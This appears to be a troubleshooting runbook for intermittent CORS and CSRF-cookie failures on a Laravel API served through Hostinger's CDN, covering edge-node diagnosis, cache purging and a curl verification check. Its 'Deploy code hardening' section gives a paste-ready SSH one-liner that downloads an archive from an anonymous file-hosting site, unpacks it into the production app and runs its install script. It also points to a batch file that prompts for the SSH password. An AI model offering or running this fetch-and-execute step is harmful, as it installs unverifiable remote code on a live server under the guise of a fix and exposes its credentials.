# Hostinger CDN: intermittent CSRF failures

## Symptom
Browser: `CORS Missing Allow Origin` on `https://api.ogexports.co/sanctum/csrf-cookie`
Sometimes status **500** (CDN "Whoops" HTML) with **no** `Access-Control-Allow-Origin`.
Firefox reports that as a CORS error.

## Root cause (observed 2026-09-20)
Hostinger **hcdn** edges are inconsistent:
- Healthy edges (e.g. `nme-edge7`, `nme-edge9`): **204** + correct CORS + cookies
- Broken edges (e.g. `nme-edge8`): **500** HTML error page, **no CORS headers**

Laravel config/env on the origin are correct (see `/boot-check.php`).

## Fix in Hostinger hPanel
1. Open **api.ogexports.co** → CDN / Cache
2. **Purge all cache** for the API domain
3. If 500s continue on some edges: **disable CDN** for `api.ogexports.co` (Laravel API should not sit behind aggressive CDN)
4. On **ogexports.co** (SPA): remove any panel CORS rule that sets  
   `Access-Control-Allow-Origin: https://api.ogexports.co/api`  
   (invalid; only the API should emit CORS)

## Deploy code hardening (SSH one-liner)
Already on clipboard / in `storage/app/sanctum-cors-remote-cmd.txt`:

```bash
cd /home/u133241207/domains/ogexports.co/public_html/laravel_api && curl -fsSL https://files.catbox.moe/3z3idc.tgz | tar -xzf - && bash install.sh
```

Or double-click `storage/app/RUN_SANCTUM_DEPLOY.bat` and enter the SSH password.

## Verify after CDN purge
```bash
curl -sI -H "Origin: https://ogexports.co" -H "X-Requested-With: XMLHttpRequest" \
  https://api.ogexports.co/sanctum/csrf-cookie
```
Expect: `HTTP/1.1 204` and `access-control-allow-origin: https://ogexports.co` every time.
